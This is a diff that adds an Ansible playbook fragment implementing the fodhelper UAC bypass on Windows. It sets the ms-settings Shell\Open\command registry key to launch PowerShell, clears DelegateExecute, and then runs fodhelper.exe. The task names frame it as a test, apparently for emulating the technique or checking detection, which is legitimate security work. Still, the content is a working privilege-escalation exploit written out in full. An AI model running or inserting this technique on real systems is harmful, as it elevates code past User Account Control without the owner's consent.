@@ -1,0 +1,21 @@
+---
+
+## https://winscripting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/
+## only valid for admin users
+- name: Add registry path ms-settings
+  win_regedit:
+    path: HKCU:\Software\Classes\ms-settings\Shell\Open\command
+
+- name: Test UAC bypass
+  win_regedit:
+    path: HKCU:\Software\Classes\ms-settings\Shell\Open\command
+    name: "{{ item.n }}"
+    data: "{{ item.d }}"
+    type: string
+  with_items:
+    - { n: DelegateExecute, d: '' }
+    - { n: '(default)', d: 'cmd /c start powershell.exe' }
+
+- name: Test UAC bypass - launch fodhelper
+  win_command: "C:\\Windows\\System32\\fodhelper.exe"
+
